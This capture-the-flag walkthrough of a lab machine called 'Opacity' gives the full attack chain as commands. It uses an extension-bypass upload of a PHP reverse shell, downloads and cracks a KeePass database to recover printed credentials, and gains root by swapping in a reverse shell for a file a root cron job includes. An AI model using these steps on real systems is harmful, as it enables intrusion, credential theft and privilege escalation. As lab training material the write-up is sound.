# OPACITY

First, perform simple fuzzing to uncover hidden directories:

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.161.213/FUZZ 
```

The page `http://10.10.106.68/cloud` allows us to upload an image via a URL. Let's prepare and upload a reverse shell!

Next, we need to start a Python server to host the shell for uploading.

```shell
python3 -m http.server 8080
```

I will use the PHP shell located in the `/pentest` directory and append `.jpg` to bypass the extension check. http://10.9.2.4:8080/PHP\_REV\_SHELL.php

!\[\[Pasted image 20250105201542.png]]

Than navigate to the given URL and remove the `.jpg` to get the shell.

***

upgrade shell :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Lets start searching now :)

A RAT WITH NO PRIVILEGES :) and Nothing in `/home` lets search for `/var/www/html` or `/opt` or grep for `data bases`

***

### COMMAND TO FIND DB

```bash
find / -type f \( -name "*.db" -o -name "*.sqlite" -o -name "*.sql" -o -name "*.kdbx" -o -name "*.mdb" -o -name "*.frm" -o -name "*.ibd" -o -name "*.sqlite3" -o -name "*.dbf" \) 2>/dev/null | grep -vE "(/var/lib/fwupd/pending.db|/var/lib/PackageKit/transactions.db|/var/lib/command-not-found/commands.db|/var/cache/man/.*|/var/cache/snapd/commands.db|/usr/lib/x86_64-linux-gnu/avahi/service-types.db|/usr/lib/firmware/regulatory.db)"
```

***

`/opt/dataset.kdbx` found :)

Unfortunately, we are unable to perform any meaningful actions with the current privileges to inspect the file. Instead, we can download the file to our machine for further analysis.

On the target system, we start a simple HTTP server to facilitate the file transfer:

```shell
www-data@opacity:/var/www/html$ python3 -m http.server 8080
```

On our machine :

```shell
wget http://10.10.63.93/dataset.kdbx  
```

```shell
file aa.kdbx                                                                                   
aa.kdbx: Keepass password database 2.x KDBX
```

it seems the file is hashed . lets extract the hash and crack it .

```shell
keepass2john dataset.kdbx > dataset.hash  
john dataset.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

PASSWORD : 741852963

After you have the password you can load up KeePass Manager to view the data.

**Install keepass2**

```
sudo apt install keepass2
```

To run keepass just type :

```python
┌─---kali㉿kali)-[~/Desktop/Pentest]
└─$ keepass2
```

upload the file than press password ---> copy password :

```c
password: Cl0udP4ss40p4city#8700
username: sysadmin
```

now we have sysadmin creds we can get the local.txt :)

since port 22 is open LETS just SSH as sysadmin

in home directory theres uncommon files lets check them

```sh
ysadmin@opacity:~/scripts$ ls -laR
.:
total 16
drwxr-xr-x 3 root     root     4096 Jul  8  2022 .
drwxr-xr-x 6 sysadmin sysadmin 4096 Feb 22  2023 ..
drwxr-xr-x 2 sysadmin root     4096 Jul 26  2022 lib
-rw-r----- 1 root     sysadmin  519 Jul  8  2022 script.php

./lib:
total 132
drwxr-xr-x 2 sysadmin root  4096 Jul 26  2022 .
drwxr-xr-x 3 root     root  4096 Jul  8  2022 ..
-rw-r--r-- 1 root     root  9458 Jul 26  2022 application.php
-rw-r--r-- 1 root     root   967 Jul  6  2022 backup.inc.php
-rw-r--r-- 1 root     root 24514 Jul 26  2022 bio2rdfapi.php
-rw-r--r-- 1 root     root 11222 Jul 26  2022 biopax2bio2rdf.php
-rw-r--r-- 1 root     root  7595 Jul 26  2022 dataresource.php
-rw-r--r-- 1 root     root  4828 Jul 26  2022 dataset.php
-rw-r--r-- 1 root     root  3243 Jul 26  2022 fileapi.php
-rw-r--r-- 1 root     root  1325 Jul 26  2022 owlapi.php
-rw-r--r-- 1 root     root  1465 Jul 26  2022 phplib.php
-rw-r--r-- 1 root     root 10548 Jul 26  2022 rdfapi.php
-rw-r--r-- 1 root     root 16469 Jul 26  2022 registry.php
-rw-r--r-- 1 root     root  6862 Jul 26  2022 utils.php
-rwxr-xr-x 1 root     root  3921 Jul 26  2022 xmlapi.php
```

Tho if we check the folder above we can see that my user `sysadmin` has permission on the folder. This means we can’t write to the file but we could replace it entirely! Let's test that!!

This time I opted for another PHP reverse shell. The same as before (pentest monkeys).

```sh
rm scripts/lib/backup.inc.php  
```

#### Now add your shell (make in the user folder of sysadmin)

```python
nano backup.inc.php   
```

#### copy and paste your reverse shell code into the file.

**Now copy the file to libs folder.**

```sh
cp backup.inc.php /home/sysadmin/scripts/lib/backup.inc.php
```

![](https://miro.medium.com/v2/resize:fit:875/1*2FZY-uSlXa1u-euqBpFScg.png)

After this is done we wait.

There is a backup script running every few minutes. Wait for a few minutes to get your reverse shell for root!

![](https://miro.medium.com/v2/resize:fit:875/1*QnOXfDAlgY5WuE3LYTrhSA.png)

Now you have full system access, grab your last flag, retire the box, and give yourself a pat on the back!
